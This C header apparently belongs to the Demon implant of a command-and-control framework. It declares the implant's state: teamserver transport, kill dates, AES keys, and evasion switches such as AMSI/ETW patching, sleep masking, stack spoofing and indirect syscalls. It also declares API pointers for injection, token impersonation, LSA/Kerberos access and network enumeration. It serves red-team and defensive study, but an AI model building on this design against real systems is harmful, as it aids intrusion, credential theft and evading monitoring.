#ifndef DEMON_DEMON_H
#define DEMON_DEMON_H

#include <windows.h>
#include <winsock2.h>
#include <ntstatus.h>
#include <aclapi.h>
#include <windns.h>

#include <Common/Native.h>
#include <Common/Macros.h>
#include <Common/Clr.h>
#include <Common/Defines.h>

#include <Core/Win32.h>
#include <Core/Token.h>
#include <Core/Pivot.h>
#include <Core/Spoof.h>
#include <Core/Jobs.h>
#include <Core/Package.h>
#include <Core/Download.h>
#include <Core/Transport.h>
#include <Core/Socket.h>
#include <Core/Kerberos.h>
#include <Core/Syscalls.h>
#include <Core/SysNative.h>
#include <Core/HwBpEngine.h>

#include <Loader/CoffeeLdr.h>

#ifdef DEBUG
#include <stdio.h>
#endif

// To prevent false alignment on x64
#pragma pack(1)
typedef struct
{
    PVOID KaynLdr;
    PVOID DllCopy;
    PVOID Demon;
    DWORD DemonSize;
    PVOID TxtBase;
    DWORD TxtSize;
} KAYN_ARGS, *PKAYN_ARGS;

// TODO: remove all variables that are not switched/changed after some time
typedef struct
{
    /* MetaData */
    PPACKAGE MetaData;

    /* The last RequestID recieved by the TS */
    UINT32 CurrentRequestID;

    /* wheather WSAStartup has been called yet */
    BOOL WSAWasInitialised;

#ifdef TRANSPORT_HTTP
    HANDLE hHttpSession;
    BOOL   LookedForProxy;
    PVOID  ProxyForUrl;
    SIZE_T SizeOfProxyForUrl;
#endif

#if defined(SHELLCODE) && defined(DEBUG)
    HANDLE hConsoleOutput;
#endif

    struct {
        PVOID ModuleBase;
        DWORD ModuleSize;
        PVOID TxtBase;
        DWORD TxtSize;
        DWORD AgentID;
        BOOL  Connected;
        DWORD PID;
        DWORD TID;
        DWORD PPID;
        WORD  OS_Arch;
        WORD  Process_Arch;
        DWORD OSVersion;
    } Session;

    struct {
        /* Sleep delay */
        DWORD Sleeping;
        DWORD Jitter;

        struct {
#ifdef TRANSPORT_HTTP
            PHOST_DATA Host;  /* current using host */
            PHOST_DATA Hosts; /* host linked list */
            UINT64     KillDate;
            UINT32     WorkingHours;
            LPWSTR     Method; /* TODO: use WCHAR[4] instead of LPWSTR. */
            SHORT      HostRotation;
            DWORD      HostIndex;
            DWORD      HostMaxRetries;
            DWORD      Secure;
            LPWSTR     UserAgent; /* TODO: change type to BUFFER */
            LPWSTR*    Uris;      /* TODO: change type to BUFFER */
            LPWSTR*    Headers;   /* TODO: change type to BUFFER */

            struct {
                BOOL   Enabled;
                LPWSTR Url;      /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
                LPWSTR Username; /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
                LPWSTR Password; /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
            } Proxy;
#endif

#ifdef TRANSPORT_SMB
            LPSTR   Name;   /* TODO: change type to BUFFER */
            HANDLE  Handle;
            UINT64  KillDate;
            UINT32  WorkingHours;
#endif
        } Transport;

        struct _CONFIG {
            DWORD SleepMaskTechnique;
            BOOL  StackSpoof;
            BOOL  SysIndirect;
            BYTE  ProxyLoading;
            BYTE  AmsiEtwPatch;
            BOOL  Verbose;
            PVOID ThreadStartAddr;
            BOOL  CoffeeThreaded;
            BOOL  CoffeeVeh;
            DWORD DownloadChunkSize;
        } Implant;

        struct {
            UINT32 Alloc;
            UINT32 Execute;
        } Memory;

        // Process Config
        struct
        {
            PWCHAR Spawn64; /* TODO: change type to BUFFER */
            PWCHAR Spawn86; /* TODO: change type to BUFFER */
        } Process;

        struct
        {
            DWORD Technique;
            PVOID SpoofAddr;
        } Inject;

        /* communication AES keys */
        struct {
            PBYTE Key;
            PBYTE IV;
        } AES;

    } Config ;

    // TODO: format everything by library. inlcude syscalls too
    struct
    {
        /* Ntdll.dll */
        WIN_FUNC( LdrLoadDll )
        WIN_FUNC( LdrGetProcedureAddress )

        WIN_FUNC( RtlAllocateHeap )
        WIN_FUNC( RtlReAllocateHeap )
        WIN_FUNC( RtlFreeHeap )
        WIN_FUNC( RtlRandomEx )
        WIN_FUNC( RtlNtStatusToDosError )
        WIN_FUNC( RtlGetVersion )
        WIN_FUNC( RtlExitUserThread )
        WIN_FUNC( RtlExitUserProcess )
        WIN_FUNC( RtlCreateTimer )
        WIN_FUNC( RtlRegisterWait )
        WIN_FUNC( RtlQueueWorkItem )
        WIN_FUNC( RtlCreateTimerQueue )
        WIN_FUNC( RtlDeleteTimerQueue )
        WIN_FUNC( RtlCaptureContext );
        WIN_FUNC( RtlAddVectoredExceptionHandler );
        WIN_FUNC( RtlRemoveVectoredExceptionHandler );
        WIN_FUNC( RtlCopyMappedMemory );

        WIN_FUNC( NtClose );
        WIN_FUNC( NtSetEvent );
        WIN_FUNC( NtSetInformationThread );
        WIN_FUNC( NtSetInformationVirtualMemory );
        WIN_FUNC( NtGetNextThread );
        WIN_FUNC( NtOpenThread )
        WIN_FUNC( NtOpenThreadToken )
        WIN_FUNC( NtTerminateProcess )
        WIN_FUNC( NtOpenProcess )
        WIN_FUNC( NtOpenProcessToken )
        WIN_FUNC( NtDuplicateToken )
        WIN_FUNC( NtQueueApcThread )
        WIN_FUNC( NtSuspendThread )
        WIN_FUNC( NtResumeThread )
        WIN_FUNC( NtCreateEvent )
        WIN_FUNC( NtCreateThreadEx )
        WIN_FUNC( NtDuplicateObject )
        WIN_FUNC( NtGetContextThread )
        WIN_FUNC( NtSetContextThread )
        WIN_FUNC( NtQueryInformationProcess )
        WIN_FUNC( NtQuerySystemInformation )
        WIN_FUNC( NtWaitForSingleObject )
        WIN_FUNC( NtTestAlert )
        WIN_FUNC( NtAllocateVirtualMemory )
        WIN_FUNC( NtWriteVirtualMemory )
        WIN_FUNC( NtReadVirtualMemory )
        WIN_FUNC( NtFreeVirtualMemory )
        WIN_FUNC( NtUnmapViewOfSection )
        WIN_FUNC( NtProtectVirtualMemory )
        WIN_FUNC( NtTerminateThread )
        WIN_FUNC( NtContinue )
        WIN_FUNC( NtAlertResumeThread )
        WIN_FUNC( NtSignalAndWaitForSingleObject )
        WIN_FUNC( NtQueryVirtualMemory )
        WIN_FUNC( NtQueryInformationToken )
        WIN_FUNC( NtQueryInformationThread )
        WIN_FUNC( NtQueryObject )
        PVOID NtTraceEvent;

        // Kernel32
        WIN_FUNC( LoadLibraryW )
        WIN_FUNC( CreateRemoteThread )
        WIN_FUNC( CreateToolhelp32Snapshot )
        WIN_FUNC( Process32FirstW )
        WIN_FUNC( Process32NextW )
        WIN_FUNC( VirtualAllocEx )
        WIN_FUNC( VirtualProtect )
        WIN_FUNC( CreateFileW )
        WIN_FUNC( GetFullPathNameW )
        WIN_FUNC( GetFileSize )
        WIN_FUNC( GetFileSizeEx )
        WIN_FUNC( CreateNamedPipeW )
        WIN_FUNC( WaitNamedPipeW )
        WIN_FUNC( PeekNamedPipe )
        WIN_FUNC( DisconnectNamedPipe )
        WIN_FUNC( WriteFile )
        WIN_FUNC( ConnectNamedPipe )
        WIN_FUNC( FreeLibrary )
        WIN_FUNC( GetProcAddress )
        WIN_FUNC( CreatePipe )
        WIN_FUNC( ReadFile )
        WIN_FUNC( GetComputerNameExA )
        WIN_FUNC( LocalAlloc )      /* TODO: replace with RtlAllocateHeap */
        WIN_FUNC( LocalFree )       /* TODO: replace with RtlFreeHeap */
        WIN_FUNC( LocalReAlloc )    /* TODO: replace with RtlReAllocateHeap */
        WIN_FUNC( CreateProcessW )
        WIN_FUNC( GetExitCodeProcess )
        WIN_FUNC( GetExitCodeThread )
        WIN_FUNC( TerminateProcess )
        WIN_FUNC( VirtualProtectEx )
        WIN_FUNC( GetCurrentDirectoryW )
        WIN_FUNC( FindFirstFileW )
        WIN_FUNC( FindNextFileW )
        WIN_FUNC( DeleteFileW )
        WIN_FUNC( RemoveDirectoryW )
        WIN_FUNC( CreateDirectoryW )
        WIN_FUNC( MoveFileW )
        WIN_FUNC( GetFileTime )
        WIN_FUNC( GetFileAttributesW )
        WIN_FUNC( FindClose )
        WIN_FUNC( FileTimeToSystemTime )
        WIN_FUNC( SystemTimeToTzSpecificLocalTime )
        WIN_FUNC( SetCurrentDirectoryW )
        WIN_FUNC( Wow64DisableWow64FsRedirection )
        WIN_FUNC( Wow64RevertWow64FsRedirection )
        WIN_FUNC( CopyFileW )
        WIN_FUNC( GetModuleHandleA )
        WIN_FUNC( GetSystemTimeAsFileTime )
        WIN_FUNC( GetLocalTime )
        WIN_FUNC( DuplicateHandle )
        WIN_FUNC( AttachConsole )
        WIN_FUNC( WriteConsoleA )
        HGLOBAL ( *GlobalFree ) ( HGLOBAL );

        /* WinHttp.dll */
        WIN_FUNC( WinHttpOpen )
        WIN_FUNC( WinHttpConnect )
        WIN_FUNC( WinHttpOpenRequest )
        WIN_FUNC( WinHttpSetOption )
        WIN_FUNC( WinHttpCloseHandle )
        WIN_FUNC( WinHttpSendRequest )
        WIN_FUNC( WinHttpAddRequestHeaders )
        WIN_FUNC( WinHttpReceiveResponse )
        WIN_FUNC( WinHttpReadData )
        WIN_FUNC( WinHttpQueryHeaders )
        WIN_FUNC( WinHttpGetIEProxyConfigForCurrentUser )
        WIN_FUNC( WinHttpGetProxyForUrl )

        // Mscoree
        HRESULT ( WINAPI *CLRCreateInstance ) ( REFCLSID clsid, REFIID riid, LPVOID* ppInterface );

        // Oleaut32
        WIN_FUNC( SafeArrayAccessData )
        WIN_FUNC( SafeArrayUnaccessData )
        WIN_FUNC( SafeArrayCreate )
        WIN_FUNC( SafeArrayCreateVector )
        WIN_FUNC( SafeArrayPutElement )
        WIN_FUNC( SafeArrayDestroy )
        WIN_FUNC( SysAllocString )

        // Advapi32
        WIN_FUNC( GetTokenInformation )
        WIN_FUNC( GetUserNameA )
        WIN_FUNC( CreateProcessWithTokenW )
        WIN_FUNC( CreateProcessWithLogonW )
        NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );
        WIN_FUNC( FreeSid )
        WIN_FUNC( SetSecurityDescriptorSacl )
        WIN_FUNC( SetSecurityDescriptorDacl )
        WIN_FUNC( InitializeSecurityDescriptor )
        WIN_FUNC( AddMandatoryAce )
        WIN_FUNC( InitializeAcl )
        WIN_FUNC( AllocateAndInitializeSid )
        WIN_FUNC( CheckTokenMembership )
        WIN_FUNC( SetEntriesInAclW )
        WIN_FUNC( LsaNtStatusToWinError )
        WIN_FUNC( EqualSid )
        WIN_FUNC( ConvertSidToStringSidW )
        WIN_FUNC( GetSidSubAuthorityCount )
        WIN_FUNC( GetSidSubAuthority)

        WIN_FUNC( ConvertThreadToFiberEx )
        WIN_FUNC( ConvertFiberToThread )
        WIN_FUNC( SwitchToFiber )
        WIN_FUNC( CreateFiberEx )
        WIN_FUNC( DeleteFiber )

        // Token Management
        WIN_FUNC( RevertToSelf )
        WIN_FUNC( LookupAccountSidA )
        WIN_FUNC( LookupAccountSidW )
        WIN_FUNC( LookupPrivilegeNameA )
        WIN_FUNC( LogonUserW )
        WIN_FUNC( AdjustTokenPrivileges )
        WIN_FUNC( OpenProcessToken )
        WIN_FUNC( OpenThreadToken )
        WIN_FUNC( LookupPrivilegeValueA )
        WIN_FUNC( SetThreadToken )

        // String Formatting
        INT ( *vsnprintf ) ( PCHAR, SIZE_T, CONST PCHAR, va_list );
        INT ( *swprintf_s ) ( PWCHAR, SIZE_T, CONST PWCHAR, ... );

        // * MISC *
        WIN_FUNC( CommandLineToArgvW )

        WIN_FUNC( AllocConsole )
        WIN_FUNC( FreeConsole )
        WIN_FUNC( GetConsoleWindow )
        WIN_FUNC( ShowWindow )
        WIN_FUNC( GetStdHandle )
        WIN_FUNC( SetStdHandle )

        WIN_FUNC( GetAdaptersInfo )

        WIN_FUNC( WaitForSingleObjectEx )


        // Screenshot
        WIN_FUNC( GetSystemMetrics )
        WIN_FUNC( GetDC )
        WIN_FUNC( GetCurrentObject )
        WIN_FUNC( GetObjectW )
        WIN_FUNC( CreateCompatibleDC )
        WIN_FUNC( CreateDIBSection )
        WIN_FUNC( SelectObject )
        WIN_FUNC( BitBlt )
        WIN_FUNC( DeleteObject )
        WIN_FUNC( DeleteDC )
        WIN_FUNC( ReleaseDC )

        // Netapi
        WIN_FUNC( NetWkstaUserEnum )
        WIN_FUNC( NetSessionEnum )
        WIN_FUNC( NetLocalGroupEnum )
        WIN_FUNC( NetGroupEnum )
        WIN_FUNC( NetUserEnum )
        WIN_FUNC( NetShareEnum )
        WIN_FUNC( NetApiBufferFree )

        /* Ws2_32.dll */
        WIN_FUNC( WSAStartup )
        WIN_FUNC( WSACleanup )
        WIN_FUNC( WSASocketA )
        WIN_FUNC( WSAGetLastError )
        WIN_FUNC( ioctlsocket )
        WIN_FUNC( bind )
        WIN_FUNC( listen )
        WIN_FUNC( accept )
        WIN_FUNC( closesocket )
        WIN_FUNC( recv )
        WIN_FUNC( send )
        WIN_FUNC( connect )
        WIN_FUNC( getaddrinfo )
        WIN_FUNC( freeaddrinfo )

        /* sspicli.dll */
        WIN_FUNC( LsaCallAuthenticationPackage )
        WIN_FUNC( LsaGetLogonSessionData )
        WIN_FUNC( LsaEnumerateLogonSessions )
        WIN_FUNC( LsaRegisterLogonProcess )
        WIN_FUNC( LsaLookupAuthenticationPackage )
        WIN_FUNC( LsaDeregisterLogonProcess )
        WIN_FUNC( LsaConnectUntrusted )
        WIN_FUNC( LsaFreeReturnBuffer )

        /* Amsi.dll */
        PVOID AmsiScanBuffer;

    } Win32;

    struct
    {
#undef OBF_SYSCALL
#ifdef OBF_SYSCALL
        WIN_FUNC( NtOpenFile )
        WIN_FUNC( NtOpenThread )
        WIN_FUNC( NtOpenThreadToken )
        WIN_FUNC( NtTerminateProcess )
        WIN_FUNC( NtOpenProcess )
        WIN_FUNC( NtOpenProcessToken )
        WIN_FUNC( NtCreateSection )
        WIN_FUNC( NtMapViewOfSection )
        WIN_FUNC( NtDuplicateToken )
        WIN_FUNC( NtQueueApcThread )
        WIN_FUNC( NtSuspendThread )
        WIN_FUNC( NtResumeThread )
        WIN_FUNC( NtCreateEvent )
        WIN_FUNC( NtCreateThreadEx )
        WIN_FUNC( NtDuplicateObject )
        WIN_FUNC( NtGetContextThread )
        WIN_FUNC( NtSetContextThread )
        WIN_FUNC( NtQueryInformationProcess )
        WIN_FUNC( NtQuerySystemInformation )
        WIN_FUNC( NtWaitForSingleObject )
        WIN_FUNC( NtTestAlert )
        WIN_FUNC( NtAllocateVirtualMemory )
        WIN_FUNC( NtWriteVirtualMemory )
        WIN_FUNC( NtReadVirtualMemory )
        WIN_FUNC( NtFreeVirtualMemory )
        WIN_FUNC( NtUnmapViewOfSection )
        WIN_FUNC( NtProtectVirtualMemory )
        WIN_FUNC( NtTerminateThread )
        WIN_FUNC( NtContinue )
        WIN_FUNC( NtAlertResumeThread )
        WIN_FUNC( NtSignalAndWaitForSingleObject )
        WIN_FUNC( NtQueryVirtualMemory )
        WIN_FUNC( NtQueryInformationToken )
        WIN_FUNC( NtQueryInformationThread )
        WIN_FUNC( NtQueryObject )
#else
        PVOID  SysAddress; /* 'syscall' instruction pointer */
        UINT32 Size; /* size of each 'syscall' stub */

        /* Syscall Service Numbers */
        WORD NtOpenThread;
        WORD NtOpenThreadToken;
        WORD NtTerminateProcess;
        WORD NtOpenProcess;
        WORD NtOpenProcessToken;
        WORD NtDuplicateToken;
        WORD NtQueueApcThread;
        WORD NtSuspendThread;
        WORD NtResumeThread;
        WORD NtCreateEvent;
        WORD NtCreateThreadEx;
        WORD NtDuplicateObject;
        WORD NtGetContextThread;
        WORD NtSetContextThread;
        WORD NtQueryInformationProcess;
        WORD NtQuerySystemInformation;
        WORD NtWaitForSingleObject;
        WORD NtAllocateVirtualMemory;
        WORD NtWriteVirtualMemory;
        WORD NtReadVirtualMemory;
        WORD NtFreeVirtualMemory;
        WORD NtUnmapViewOfSection;
        WORD NtProtectVirtualMemory;
        WORD NtTerminateThread;
        WORD NtAlertResumeThread;
        WORD NtSignalAndWaitForSingleObject;
        WORD NtQueryVirtualMemory;
        WORD NtQueryInformationToken;
        WORD NtQueryInformationThread;
        WORD NtQueryObject;
        WORD NtClose;
        WORD NtSetEvent;
        WORD NtSetInformationThread;
        WORD NtSetInformationVirtualMemory;
        WORD NtGetNextThread;
#endif
    } Syscall;

    struct
    {
        PVOID Ntdll;
        PVOID Kernel32;
        PVOID Advapi32;
        PVOID Mscoree;
        PVOID Oleaut32;
        PVOID User32;
        PVOID Shell32;
        PVOID Msvcrt;
        PVOID Iphlpapi;
        PVOID Gdi32;
        PVOID NetApi32;
        PVOID Ws2_32;
        PVOID Sspicli;

        /* used for bypass */
        PVOID Amsi;

#ifdef TRANSPORT_HTTP
        PVOID WinHttp;
#endif
    } Modules;

    /* The main thread environment block */
    PTEB  Teb;

    /* Thread counter. how many threads that are using our code are running ? */
    DWORD  Threads;

    /* A list of packages that have to be sent to the teamserver */
    PPACKAGE Packages;

    /* Buffer to use for allocating download chunks. */
    BUFFER DownloadChunk;

    /* This is a global variable for dotnet inline-execute
     * holds our CLR instance, assembly and where to output. */
    PDOTNET_ARGS Dotnet;

    /* Linked lists */
    struct {
        PTOKEN_LIST_DATA Vault;

        /* Impersonate token. */
        PTOKEN_LIST_DATA Token;
        BOOL             Impersonate;
    } Tokens;
    PPIVOT_DATA          SmbPivots;
    PJOB_DATA            Jobs;
    PDOWNLOAD_DATA       Downloads;
    PMEM_FILE            MemFiles;
    PSOCKET_DATA         Sockets;
    PCOFFEE              Coffees;
    PHWBP_ENGINE         HwBpEngine;

} INSTANCE;

extern INSTANCE Instance;

VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs );
VOID DemonRoutine( );
VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs );
VOID DemonMetaData( PPACKAGE* Package, BOOL Header );
VOID DemonConfig();

#endif
